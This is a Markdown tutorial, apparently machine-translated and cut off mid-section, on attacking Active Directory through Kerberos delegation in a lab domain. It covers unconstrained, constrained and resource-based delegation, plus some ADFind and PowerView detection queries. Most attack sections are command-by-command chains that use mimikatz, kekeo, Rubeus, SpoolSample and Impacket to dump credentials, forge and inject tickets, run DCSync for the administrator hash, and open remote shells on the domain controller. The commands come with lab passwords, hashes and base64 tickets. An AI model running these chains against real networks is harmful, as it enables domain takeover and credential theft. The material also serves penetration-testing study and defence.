# Domain infiltration & delegation attacks

## Delegation
Delegation is an in-domain application model, which refers to delegating the permissions of the in-domain user account to a service account. The service account can therefore launch activities within the domain as a user (requesting new services, etc.). In domain delegation, the user that can be delegated can only be a service account or a machine account.
- Machine Account: Computers in the `Computers` group in the active directory, also known as machine account;
- Service Account: A type of user in the domain is the account used by the server to run the service. It runs the service and adds it to the domain, such as `SQLServer`, `MYSQL`, etc. In addition, domain users can also become service accounts by registering `SPN`.

There are three main types of delegation:
- Unconstrained Delegation (`UD`): Unconstrained Delegation refers to the user account forwarding its own `TGT` to the service account for use;
- Constrained Delegation (`CD`): Constrained Delegation restricts service accounts to access only specified service resources through the two extended protocols `S4U2Self` and `S4U2Proxy`;
- Resource-based Constrained Delegation (`RBCD`): Resource-based Constrained Delegation is the delegated management handed over to service resources for control, and the rest are basically the same as binding delegation.

## Non-constrained delegation attacks
### Overview
Since `Windows Server 2000`, Microsoft has added delegation. Domain delegation is an application model, which refers to delegating the permissions of users in the domain to a service account, so that the service account can launch activities within the domain with the user's permissions. To briefly introduce it, the user `A` access service`B`, but during the access process, service `C` is required, so service `B` uses the `TGT` delegated access service`C` provided by user `A`.

In non-binding delegation, the service account can request the `TGT` of the user in the domain, and the service account uses the `TGT` to simulate the user in the domain to access any service. Systems configured as non-constrained delegation will store `TGT` into `LSASS` memory to enable users to access terminal resources. The setting of non-constrained delegation requires the `SeEnableDelegation` permission, which is generally the administrator has this permission. The domain control machine account configures non-constrained delegation by default.

![](./images/1.png#pic_center)

The above figure describes the steps related to non-constrained delegation:

```
1. The user authenticates to the Key Distribution Center (KDC) by sending a KRB_AS_REQ message, the request message in an Authentication Service (AS) exchange, and requests a forwardable TGT.
2. The KDC returns a forwardable TGT in the KRB_AS_REP message, the response message in an Authentication Service (AS) exchange.
3. The user requests a forwarded TGT based on the forwardable TGT from step 2. This is done by the KRB_TGS_REQ message.
4. The KDC returns a forwarded TGT for the user in the KRB_TGS_REP message.
5. The user makes a request for a service ticket to Service 1 using the TGT returned in step 2. This is done by the KRB_TGS_REQ message.
6. The ticket-granting service (TGS) returns the service ticket in a KRB_TGS_REP.
7. The user makes a request to Service 1 by sending a KRB_AP_REQ message, presenting the service ticket, the forwarded TGT, and the session key for the forwarded TGT. Note: The KRB_AP_REQ message is the request message in the Authentication Protocol (AP) exchange.
8. To fulfill the user's request, Service 1 needs Service 2 to perform some action on behalf of the user. Service 1 uses the forwarded TGT of the user and sends that in a KRB_TGS_REQ to the KDC, asking for a ticket for Service 2 in the name of the user.
9. The KDC returns a ticket for Service 2 to Service 1 in a KRB_TGS_REP message, along with a session key that Service 1 can use. The ticket identifies the client as the user, not as Service 1.
10. Service 1 makes a request to Service 2 by a KRB_AP_REQ, acting as the user.
11. Service 2 responses.
12. With that response, Service 1 can now respond to the user's request in step 7.
13. The TGT forwarding delegation mechanism as described here does not constrain Service 1's use of the forwarded TGT. Service 1 can ask the KDC for a ticket for any other service in the name of the user.
14. The KDC will return the requested ticket.
15. Service 1 can then continue to impersonate the user with Service N. This can pose a risk if, for example, Service 1 is compromised. Service 1 can continue to masquerade as a legitimate user to other services.
16. Service N will respond to Service 1 as if it was the user's process.
```

### Environment construction

```
Domain name: hack.local
Domain control:
    Operating system: Windows Server 2012 R2
    Host Name: DC
    IP: 10.10.10.137
In-domain server:
    Operating system: Windows Server 2016
    Host Name: WIN-WEB
    IP: 10.10.10.136, 192.168.31.247
Attack aircraft:
    Operating System: MacOS
    IP: 192.168.31.206
```

The non-constrained delegation settings for machine accounts are as follows:

![](./images/2.png#pic_center)

The non-constrained delegation settings for the service account are as follows: First create a normal domain user, and then register `SPN` to become a service account:

```powershell
setspn -U -A MSSQLSvc/mssql.hack.local:1433 UDUser
```

![](./images/3.png#pic_center)

At this time, the user `UDUser` already has the delegation attribute and is then set to non-constrained delegation.

![](./images/4.png#pic_center)

### Detection method

1. Use `ADFind` to detect whether there is a non-constrained delegation

```powershell
# ADFind query non-constrained delegation of ordinary accounts
AdFind.exe -b "DC=hack,DC=local" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
# ADFind query non-constrained machine accounts
AdFind.exe -b "DC=hack,DC=local" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
```

![](./images/5.png#pic_center)

2. Use PowerView to detect whether there is a non-constrained delegation

`
``powershell
# PowerView query for non-constrained delegated machine accounts
Import-Module ./PowerView.ps1
Get-NetComputer -Unconstrained | Select-Object dnshostname, samaccountname
```

![](./images/6.png#pic_center)

### Attack ideas

#### Construct service account tickets

Conditions of use:
- Non-binding delegation is set up for service account
- Password password information for known service accounts

Suppose that through some means, the password of the user `UDUser` in the domain is `H3rmesk1t@2023`, and the `UDUser` has set a non-binding delegation and uses the `kekeo` tool to operate.

```powershell
# Construct the tickets for the UDUser service account
kekeo.exe "tgt::ask /user:UDUser /domain:hack.local /password:H3rmesk1t@2023 /ticket:UDUser.kirbi" "exit"

# Use the UDUser ticket that you just forged, and apply for CIFS service tickets from the domain server.
kekeo.exe "Tgs::s4u /tgt:TGT_UDUser@HACK.LOCAL_krbtgt~hack.local@HACK.LOCAL.kirbi /user:administrator@hack.local /service:cifs/DC.hack.local" "exit"

# Use mimikatz to inject the ticket into the current session.
mimikatz.exe "kerberos::ptt TGS_administrator@hack.local@HACK.LOCAL_UDUser@HACK.LOCAL.kirbi" "exit"

# Access the target shared disk
dir \\DC.hack.local\C$
```

![](./images/7.png#pic_center)

#### Induce domain administrators to access the machine

When the domain administrator uses remote access commands such as `net use` to simulate the domain administrator accessing the `WIN-WEB` host, the host that has been set up with a non-binding delegation can capture the `TGT` of the domain administrator.

Conditions of use:
- Requires `Administrator` permission
- Non-constrained delegation is enabled for machine accounts of hosts in the domain
- Domain Control Administrator Remote Access

```powershell
# Export tickets by host within the domain
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# View tickets
mimikatz.exe "kerberos::list" "exit"

# Clear the ticket, you can use the absolute path
mimikatz.exe "kerberos::purge"
mimikatz.exe "kerberos::purge [ticket]"

# Import memory
mimikatz.exe "kerberos::ptt [0;16264b]-2-0-40e10000-Administrator@krbtgt-HACK.LOCAL.kirbi" "exit"

# Access the target disk
dir \\DC.hack.local\C$
```

![](./images/8.png#pic_center)

![](./images/9.png#pic_center)

#### In combination with printer vulnerabilities

Force the host running the Print Service (`Print Spooler`) to initiate a `Kerberos` or `NTLM` authentication request to the target host.

Conditions of use:
- Requires `Administrator` permission

```powershell
# Check whether the printing service is enabled | View on domain control
sc query spooler

# Use Rubeus to listen for tickets from domain control
Rubeus.exe monitor /interval:2 /filteruser:DC$

# Use the SpoolSample tool to perform printer vulnerability exploitation, perform forced verification, and connect to the TGT of the domain control machine account. You need to use the domain user to run SpoolSample, and you need to close the firewalls on both sides.
runas /user:hack.local\UDUser powershell
SpoolSample.exe DC WIN-WEB

# Rubeus listens to the ticket and imports the ticket
Rubeus.exe ptt /ticket:doIE5DCCBOCgAwIBBaEDAgEWooID9DCCA/BhggPsMIID6KADAgEFoQwbCkhBQ0suTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkhBQ0suTE9DQUyjggOwMIIDrKADAgESoQMCAQKiggOeBIIDmprRYFAlBgv4kCHkTWTg+0UWmCfmJfaeWv8vDqhDv3aVI1xh5Wy32A mmuFZpdOLjrn8lYsgm3CMBrqy6paJWkZ+pGVY3CLOpi6APpwwLDdxTHHHEM7eyUXuGSusXuV5Tki33hUIJavrcc26ik4uvlYYe3wZTVT3NxTioEY0bDywYHBqV649Oy85CFM022Khbg2mwb04CjLn7wHBgavmdLqC+LW5Z1/DjEEvSijDyXIH8LCgneZ8UW4D/KoTbfZp1JhisWNUIb Fcjoj0Kw8h/jnjpSfOnieNH01H84Q9pHjhD8n4QWw8jrYM1kLRwdV/dLh8buph7eY6ExSzv7tsBV5+T7knitJnRq9TKdZqQENTulDh8ESh4nHPj0D5z/3kGzl8UaW6vAf1137YicsrGtCQwqvnKpe/TsBn1N5V/pyj+7eXI1gKm6+AtPaaTQcCpQfWZe8cqorPjxviMfhDSyVfCyKD CZYo4VfVwAXAdB+2xCKfHkqh+wIDMsPDMk4jjAnVM3HObfT5mJEyikj1NOak+/Y4ARkxz/qcSq3RmutVTOWF4V5vzz4Jg9BFQjVJZrRLGck0dsFBqPz5xPGuUH0h1M+1+vRVba9Yh4ZmIk+TCnqmhaFWVP173O2bhBXA5m2kSJjZrjqQ8TP+ZSIuKp+cEZ9GO0k2Xs52dSw/C2+26aS zcZzGyRd7V400U8TIDtPPhJxU/85hW2l7bWzMPmuGp621SIcVwt2tVsrHCsXVoZyu/rj3ZGS3OupZBJMDbudDlrCneH4JHiV9Df3kz4aDV0hG8Azl+q56QByZSv/FcWx/TM1tIOCphcpQA1m2Bv95fdbxWlgzUPwjZ+BLuVyobS0vpaJQhS2vvFq7TbYj9H7NfjEAbJwHs1FCpKHRm FWXQvQiDvPNvTnZ6Ea1WiHT8pH8NtNtct0heM5rJI05IVmsiNgVM6qTUUZRvTZObpdHxusF882kVXvqaRMn+seZnBf916jBGqqVN5Z7IENMxQAdVJwfXAvePBW5DRKozE1Hhr8af3AD8WK+3B7nelD0IEYRJLgBPx9lXETC00tArUL8KSwNXFgJtunzz3DoQhJNKt+Y5yCxYJz7UTLa a/JG9cguIHHAHV6T07jdHjKvU1VLqkOK5SmEtvgK6J6tuZ+iWPNR9v/fAYBmF0tECd/vseShk52bBCpnxsalw9lZ3h4kj1vROQYfghCpuBZUwszMT2XhpHSQHKH2jgdswgdigAwIBAKKB0ASBzX2ByjCBx6CBxDCBwTCBvqArMCmgAwIBEqEiBCCUEXzAfBCpb/UDPr8oSeLBb/1le Zz9QgQ2K5m2/ULfM6EMGwpIQUNLLkxPQ0FMohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjMxMjEzMDUzOTI2WqYRGA8yMDIzMTIxMzE1MzkyNlqnERgPMjAyMzEyMTgxNTM3NDRaqAwbCkhBQ0suTE9DQUypHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkhBQ0suTE9DQUw=

# mimikatz exports user Hash in the domain
mimikatz.exe "lsadump::dcsync /domain:hack.local /user:HACK\Administrator" "exit"
```

![](./images/10.png#pic_center)

![](./images/11.png#pic_center)

![](./images/12.png#pic_center)

Then, use the exported `Hash` and use hash delivery methods such as `Wmiexec` to execute remote commands.

```bash
python3 wmiexec.py -hashes:96b26b0744352a9d91516132c3fe485d hack.local/administrator@DC.hack.local -no-pass

python3 wmiexec.py -hashes:96b26b0744352a9d91516132c3fe485d hack/administrator@10.10.10.137
```

![](.
/images/13.png#pic_center)

## Constrained delegation attacks
### Overview

Due to the insecurity of non-constrained delegation, Microsoft released the function of constrained delegation in Windows Server 2003. Microsoft introduced two extended protocols `S4u2Self` (`Service for User to Self`) and `S4U2Proxy` (`Service for User to Proxy`) for the TGS_REQ` and `TGS_REP` phases of the Kerberos protocol.

In kerberos in constrained delegation, the user will also send `TGT` to the relevant delegated services. However, due to the influence of `S4U2Proxy`, the sent to the delegated services are restricted to accessing other services. The delegated services are not allowed to use this `TGT` on behalf of the user to access any service, but can only access the specified services.

There are two types of constraint delegation:
- Only use `Kerberos`, no protocol conversion is possible
- Use any authentication protocol

### S4U2Self & S4U2Proxy

1. `S4U2Self`: The `S4U2Self` protocol allows the service to request ST service tickets for accessing its own service on behalf of any user. If the `userAccountControl` flag of a service account is `TRUSTED_TO_AUTH_FOR_DELEGATION`, it can obtain the `TGS`/`ST` of its own service on behalf of any other user.
2. `S4U2Proxy`: The `S4U2Proxy` protocol allows a service to obtain a service ticket for another service on behalf of any user under the `ST` service ticket. The service account can obtain the `TGS`/`ST` of the service set in `msDS-AllowedToDelegateTo` on behalf of any user. First, it needs to go from that user to its own `TGS`/`ST`, but it can use `S4U2Self` to obtain this `TGS`/`ST` before requesting another `TGS`.

The flowchart of the service that the user requests a constraint delegation is as follows:

![](./images/14.png#pic_center)

 - `S4U2Self`:
   - The user sends a request to `Service1`, the user has been authenticated, but `Service1` does not have authorized data for the user, usually, this is because the authentication is verified by other means other than `Kerberos`
   - `Service1` requests `ST1` for accessing `Service1` in the name of the user through the `S4U2Self` extension to `KDC`
   - `KDC` returns to `Service1` a `ST1` used for user verification `Service1`, which may contain user authorization data
   - `Service1` can use authorization data in `ST1` to satisfy the user's request and then respond to the user

Although `S4U2Self` provides information about the user to `Service1`, `S4U2Self` does not allow `Service1` to make requests for other services on behalf of the user, and it is the turn of `S4U2Proxy` to play a role.

 - `S4U2Proxy`:
   - The user sends a request to `Service1`, and `Service1` needs to access the resources on `Service2` as a user
   - `Service1` requests the user to access `ST2` of `Service2` in the name of the user to `KDC`
   - If the request contains `PAC`, then `KDC` verify `PAC` by checking the signature data of `PAC`, if `PAC` is valid or does not exist, then `KDC` returns `ST2` to Service1`, but the client identities stored in the `cname` and `crealm` fields of `ST2` are the user's identity, not the `Service1` identity.
   - `Service1` uses `ST2` to send a request to `Service2` in the name of the user and determines that the user has been authenticated by `KDC`
   - `Service2` responds to request for step `8`
   - `Service1` responds to user requests in step `5`

The account attributes configured with binding delegation will have the following two changes:
 - The account `userAccountControl` property will be set to the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag with a value of `16781312`
 - The `msDS-AllowedToDelegateTo` property of the account, add services that allow delegation

### Environment construction

```
Domain name: hack.local
Domain control:
    Operating system: Windows Server 2012 R2
    Host Name: DC
    IP: 10.10.10.137
In-domain server:
    Operating system: Windows Server 2016
    Host Name: WIN-WEB
    IP: 10.10.10.136, 192.168.31.247
Attack aircraft:
    Operating System: MacOS
    IP: 192.168.31.206
```

The constraint delegation of machine accounts is as follows, delegate the `cifs` service of `DC:

![](./images/15.png#pic_center)

The non-constrained delegation settings for the service account are as follows, delegate the `cifs` service of `DC`:

![](./images/16.png#pic_center)

### Detection method

1. Use `ADFind` to detect whether there is a constrained delegation

```powershell
# AdFind.exe query constraints delegation machine account
AdFind.exe -b "DC=hack,DC=local" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto

# AdFind.exe query constraint delegation service account
AdFind.exe -b "DC=hack,DC=local" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
```

![](./images/17.png#pic_center)

2. Use PowerView to detect whether there is a non-constrained delegation

```powershell
# PowerView query constraints delegated machine account
Import-Module ./PowerView.ps1
Get-DomainComputer -TrustedToAuth -domain hack.local -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | ft -Wrap -AutoSize

# PowerView query constraint delegation service account
Import-Module ./PowerView.ps1
Get-DomainUser –TrustedToAuth -domain hack.local -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto | fl
```

### Attack ideas
##### Tickets using machine account

The key to a binding delegation attack is to obtain a forwarded service ticket ST. According to the execution process of the binding delegation, we can know that as long as the machine that configures the binding delegation service and obtains its password, we can hijack the Kerberos request process of this host and finally obtain the ticket of any user permissions.

Conditions of use:
- Requires `Administrator` permission
- The target machine account is configured with binding delegation

```powershell
# Export tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Application for a ticket for a machine account
kekeo.exe "tgs::s4u /tgt:[0;3e7]-2-1-40e10000-WIN-WEB$@krbtgt-HACK.LOCAL.kirbi /user:Administrator@hack.local /service:cifs/DC.hack.local" "exit"

# Import tickets
mimikatz.exe "kerberos::ptt TGS_Administrator@hack.local@HACK.LOCAL_cifs~DC.hack.local@HACK.LOCAL.kirbi" "exit"

# Visit
dir \\DC.hack.local\C$
```

![](./images/18.png#pic_center)

![](./images/19.png#pic_center)

#### Use the Hash Value of the Machine Account

It is similar to the idea of ​​ticket attack using machine accounts, but the `Hash` value is used here.

Conditions of use:
- Requires `Administrator` permission
- The target machine account is configured with binding delegation

```powershell
# Use mimikatz to get machine account NTLM Hash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
dd3c90bd9c09c393521d46fe8955e9f6

# Use Rubeus to apply for TGT that constrains the delegated machine account WIN-WEB$
Rubeus.exe asktgt /user:WIN-WEB$ /rc4:dd3c90bd9c09c393521d46fe8955e9f6 /domain:hack.local /dc:DC.hack.local /nowrap

# Use Rubeus to pass
S4U2Self protocol requests tickets for domain control CIFS services on behalf of the domain administrator Administrator and injects memory
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.hack.local /dc:DC.hack.local /ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID8TCCA+1hggPpMIID5aADAgEFoQwbCkhBQ0suTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmhhY2subG9jYWyjggOtMIIDqaADAgESoQMCAQKiggObBIIDl62eAXEBcsFR1ZArpG77Sy8bCYgTlgs4J2d4c/fJRK96uR2Hwn0G v6ctgohyrxESGUGz1yvJc4zpG9htonPM/dkYKwqD9srjvlUoHrfdUuFXmwO5imqmyZiKj0Jtq7if/APokTOvzU3CKlTum/uyElk8lMiIDdriWkvcNIuTjCuyVsVjWMeMR9JSmedO1hHnyGNoyMp/RXZrrnfpiD3A9PB7/eRSLCVF+A56DjyytLTMYncl7kvrYghFpJE1x5lA1yXk a4CmXmYPJgZou3lFtpyORxv0E77Apf5Osr/8xWn2L+orw9QJg181ztENYShYcmrKf7g55KifZknjJz+HSSZBsianmi4DQXoxj5zFB1pRiyaWIA/YHAtg7+YjvjVQ+ODNW5xshLEfi0tms9gXNlGCyUO1VISeUPeV8As4RCuLdryO1TRgT1aNXbrTYwLEO+0Vi3RiJJG1NCzrwvND B15Z8X22T6mvqT7m4VShi2UXl4u+udFo2ilUTDOM//Tm1Iry6E0u46ZqWvoGtZSVoujKsPu06m511LAa+YNzj+QCTQLIjbAiyOXeIO6VYqyf7smilqae7u68uP0KGTDcSqaVevUzbgpZN5YKWAytcE+M67uRBXj+RkBP6785k55yn+KrI3AQq1WV4AcCCozTQKHrAQIyjWGuelNg HlN9DS3THdiwTEOIG3DdC8+WBVdaEe1UAfN4ak+OOuFxIBDUgWI0klfHVh5Dob2Kb8SnmRQuO7rXu7fMiE4XG2fj7E2iQvDn211S3+ynVICb//QT4ZC1LIPsgp9wqQVarizoh/u4hIXTHc/ELqgKqg2bU14+XmiMZ4epVFbm8lPFvFqgw8n9EaGK0NSsK3RR7RZaEbKmJlMCGF0s ZMEGY617/R13kRGzTrgJxYVpD9jK4f2SZxa4eMoNHXQ9jconEfxPQji52CMftt3alo1hQcjLnm/OPAb6SPcMoqVv/p/HtfdiFOy+3rJX+Eurw8HV3R60c3MzpakUa6p+extyMquW5AfT83sw+nJVydlHRqbRD0RBXMi5H//w/LwT9Xj6nETdoYVXXx8ETLFRwbbUcjjz2PztlLma M5RlTM7o4JfBH28cppr6D7XxxQqrUZNEDEkAArHsxWgnPWR6O0iLshjCTFyecUC/8tljWEBd4vrjMXpsNbLgf8RQ5WPDXcQsuxRh3WWcw572Y0g6s08KNtdpwc56/Et6ysvhnmijgdAwgc2gAwIBAKKBxQSBwn2BvzCBvKCBuTCBtjCBs6AbMBmgAwIBF6ESBBCjJtWXFNnraT45 cXBOaejuoQwbCkhBQ0suTE9DQUyiFTAToAMCAQGhDDAKGwhXSU4tV0VCJKMHAwUAQOEAAKURGA8yMDIzMTIxMzA5Mzc1MlqmERgPMjAyMzEyMTMxOTM3NTJapxEYDzIwMjMxMjIwMDkzNzUyWqgMGwpIQUNLLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0GwpoYWNrLmxvY2Fs

# Visit
dir \\DC.hack.local\C$
```

![](./images/20.png#pic_center)

![](./images/21.png#pic_center)

![](./images/22.png#pic_center)

#### Use machine account Hash value 2.0

The same as the Hash value attack idea of ​​using a machine account, and it is also the Hash value of the machine account. However, here we use the getST.py script in the Impacket tool suite to request service tickets, and use the script to log in remotely through the `wmiexec.py` tool.

Conditions of use:
- Requires `Administrator` permission
- The target machine account is configured with binding delegation

```powershell
# mimikatz get machine account NTLM Hash value
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Use getST to apply for service tickets
python3 getST.py -dc-ip 10.10.10.137 -spn CIFS/DC.hack.local -impersonate administrator hack.local/WIN-WEB$ -hashes :dd3c90bd9c09c393521d46fe8955e9f6

# Use tickets to access remotely, you need to add the domain name to hosts
KRB5CCNAME=administrator.ccache python3 wmiexec.py -k hack.local/administrator@DC.hack.local -no-pass -dc-ip 10.10.10.137
```

![](./images/23.png#pic_center)

#### Use machine account Hash value 3.0

```powershell
# mimikatz get machine account NTLM Hash value
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Request a ticket
kekeo.exe "tgt::ask /user:WIN-WEB$ /domain:hack.local /NTLM:dd3c90bd9c09c393521d46fe8955e9f6" "exit"

# Tickets for applying for administrator permissions
kekeo.exe "tgs::s4u /tgt:TGT_WIN-WEB$@HACK.LOCAL_krbtgt~hack.local@HACK.LOCAL.kirbi /user:Administrator@hack.local /service:cifs/DC.hack.local" "exit"

# mimikatz
mimikatz.exe "kerberos::ptt TGS_Administrator@hack.local@HACK.LOCAL_cifs~DC.hack.local@HACK.LOCAL.kirbi" "exit"

# Visit
dir \\DC.hack.local\C$
```

![](./images/24.png#pic_center)

![](./images/25.png#pic_center)

#### Tickets for using service accounts

```powershell
# Construct the tickets for the UDUser service account
kekeo.exe "tgt::ask /user:UDUser /domain:hack.local /password:H3rmesk1t@2023 /ticket:UDUser.kirbi" "exit"

# Use the UDUser ticket that you just forged, and apply for CIFS service tickets from the domain server.
kekeo.exe "Tgs::s4u /tgt:TGT_UDUser@HACK.LOCAL_krbtgt~hack.local@HACK.LOCAL.kirbi /user:administrator@hack.local /service:cifs/DC.hack.local" "exit"

# Use mimikatz to inject the ticket into the current session.
mimikatz.exe "kerberos::ptt TGS_administrator@hack.local@HACK.LOCAL_cifs~DC.hack.local@HACK.LOCAL.kirbi" "exit"

# Access the target shared disk
dir \\DC.hack.local\C$
```

![](./images/26.png#pic_center)

![](./images/27.png#pic_center)

## Resource-based binding delegation
### Overview

Microsoft has introduced resource-based binding delegation (`Resource Based Constrained Delegation, `RBCD`) in `Windows Server 2012. `RBCD` does not need to be modified by a domain administrator with `SeEnableDelegationPrivilege` permission, but instead gives the permission to set properties to the service resource itself.

Account with `RBCD` configured
The attributes have the following changes:
- `msDS-AllowedToActOnBehalfOfOtherIdentity` property points to the delegated account

Resource-based binding delegation can be understood as a reverse process of traditional binding delegation. Taking the two services of Service1 and Service2 as examples, traditional binding delegation requires setting the `msDS-AllowedToDelegateTo` attribute on Service1 to specify which service on Service2 to delegate. In resource-based binding delegation, the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute value needs to be set to the `SID` of `Service1` to allow `Service1` to delegate services on `Service2`. In addition, in traditional binding delegation, the ST` bills applied for through `S4U2Self` must be forwardable. If they cannot be forwarded, the subsequent `S4U2Proxy` stage will fail. However, in resource-based binding delegation, non-forwardable ST tickets can still be delegated authentication for other services through the `S4U2Proxy` stage.

Conditions of use:
- Have permission to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the host
  - User account that adds the host to the domain (there is a `mSDS-CreatorSID` attribute in the account, which is used to mark the `SID` value of the user account used when joining the domain, and you can further know some user accounts with domain access)
  - Member of the `Account Operator` group
  - The host's machine account
- Can create machine accounts (or known machine accounts)
  - For general domain members, it is determined by the `msDS-MachineAccountQuota` property, and `10` machine accounts can be created by default

### Environment construction

```
Domain name: hack.local
Domain control:
    Operating system: Windows Server 2012 R2
    Host Name: DC
    IP: 10.10.10.137
In-domain server:
    Operating system: Windows Server 2016
    Host Name: WIN-DATA
    IP: 10.10.10.135, 192.168.31.231
In-domain server:
    Operating system: Windows Server 2016
    Host Name: WIN-WEB
    IP: 10.10.10.136, 192.168.31.247
Attack aircraft:
    Operating System: MacOS
    IP: 192.168.31.206
```

Here we first get rid of the domain, then use the ordinary domain user to re-enter the domain, and remove all the delegations of the ordinary domain user.

### Detection method

Find the user who can modify `msDS-AllowedToActOnBehalfOfOtherIdentity`, that is, find the user who can modify the delegation permissions. Using reverse thinking, you have known machine accounts and find the user account that joins it in the domain. This user account has the permission to modify `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```powershell
# Use adfind.exe to find the mS-DS-CreatorSID property of the machine account
AdFind.exe -h 10.10.10.137 -u UDUser -up 123.com -b "DC=hack,DC=local" -f "objectClass=computer" mS-DS-CreatorSID

# Use Powershell to check the corresponding users of SID
powershell $objSID = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-968465445-4220942410-845371271-1108;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value
```

![](./images/28.png#pic_center)

### Attack ideas
##### Resource-based constraint delegation attacks local authority elevation

During the attack, if you obtain the permissions of `UDUser`, you can use the permissions of this user to increase the privileges locally:
 - Create a machine account using the `UDUser` domain user (each domain user can create `10` by default)
 - Then modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` of `WIN-WEB` for the `sid` of the newly created machine user`
 - Then use the machine account to apply for bills to escalate rights

1. Add a machine account

```bash
# Create a machine account using addcpputer
python3 addcomputer.py hack.local/UDUser:123.com -method LDAPS -computer-name test\$ -computer-pass Passw0rd -dc-ip 10.10.10.137

# Create a machine account using bloodyAD tool
python3 bloodyAD.py -d hack.local -u UDUser -p '123.com' --host 10.10.10.137 addComputer test 'Passw0rd'

# Create a machine account using PowerMad tool
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString "Passw0rd" -AsPlainText -Force)

# Query whether the query was successfully added
net group "domain computers" /domain
```

![](./images/29.png#pic_center)

2. Set delegation attributes

```bash
# Use PowerView tool to query the sid of the machine account
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-NetComputer test -Properties objectsid
# test$ sid S-1-5-21-968465445-4220942410-845371271-1112
```

![](./images/30.png#pic_center)

```bash
# Modify the delegation attribute of the service resource, that is, the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-968465445-4220942410-845371271-1112)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer WIN-DATA| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# Query properties (the latter command uses the Active Directory module, the domain control defaults)
Get-DomainComputer WIN-DATA -Properties msds-allowedtoactonbehalfofotheridentity

# Clear the value of the msds-allowedtoactonbehalfofotheridentity property
Set-DomainObject WIN-DATA -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose
```

![](./images/31.png#pic_center)

3. Apply for a service ticket

```bash
# Use getST.py to apply for tickets
python3 getST.py hack.local/test$:Passw0rd -spn cifs/WIN-DATA.hack.local -impersonate administrator -dc-ip 10.10.10.137

# Log in directly, you still need to add the domain name to hosts, otherwise it will not be resolved. The SYSTEM permission is available on psexec
KRB5CCNAME=administrator.ccache python3 wmiexec.py -k hack.local/administrator@WIN-DATA.hack.local -no-pass
KRB5CCNAME=administrator.ccache python3 psexec.py -k hack.local/administrator@WIN-DATA.hack.local -no-pass
```

![](./images/32.png#pic_cen
ter)

![](./images/33.png#pic_center)

#### Known the user of the Account Operators group takes down the host
In the attack idea of ​​resource-based constraint delegation attacks local authority elevation, after obtaining the user who joins the domain, you can obtain the hosts you join. The `Acount Operators` group user in this attack idea can obtain all hosts in the domain except the domain control, because the members of the `Acount Operators` group can modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of any host in the domain. .

Conditions of use:
- Obtain user account belonging to the `Acount Operators` group
- Can create machine accounts

First set the `UDUser` domain user to the `Acount Operators` group user.

![](./images/34.png#pic_center)

1. Query the `Acount Operators` group members

```bash
adfind.exe -h 10.10.10.137:389 -s subtree -b CN="Account Operators",CN=Builtin,DC=hack,DC=local member
```

![](./images/35.png#pic_center)

2. Create a machine account

```bash
# Create a machine account using PowerMad tool
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount test3 -Password $(ConvertTo-SecureString "Passw0rd" -AsPlainText -Force)

# Query whether the query was successfully added
net group "domain computers" /domain
```

![](./images/36.png#pic_center)

3. Set delegation attributes

```bash
# Use PowerView tool to query the sid of the machine account
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-NetComputer test3 -Properties objectsid
# test3$ sid S-1-5-21-968465445-4220942410-845371271-1113
```

```bash
# Modify the delegation attribute of the service resource, that is, the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-968465445-4220942410-845371271-1113)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer WIN-DATA| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# Query properties (the latter command uses the Active Directory module, the domain control defaults)
Get-DomainComputer WIN-DATA -Properties msds-allowedtoactonbehalfofotheridentity
```

![](./images/37.png#pic_center)

4. Apply for a service ticket

```bash
# Use getST.py to apply for tickets
